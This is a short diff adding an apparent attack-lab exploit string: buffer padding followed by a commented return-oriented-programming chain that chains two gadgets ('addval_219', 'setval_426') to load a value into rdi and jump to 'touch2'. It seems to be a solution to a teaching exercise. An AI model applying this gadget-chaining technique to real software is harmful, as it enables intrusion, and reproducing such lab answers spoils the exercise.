@@ -1,0 +1,9 @@
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+ab 19 40 00 00 00 00 00 /* first addr of gadget 1  addval_219 + 4 pop rax */
+fa 97 b9 59 00 00 00 00 /* rsp after ret from get buf pop, gets popped by gadget1 */
+c5 19 40 00 00 00 00 00 /* addr of gadget 2: setval_426 + 2 bytes for mov rax, rdi */
+ec 17 40 00 00 00 00 00 /* addr of touch2 */
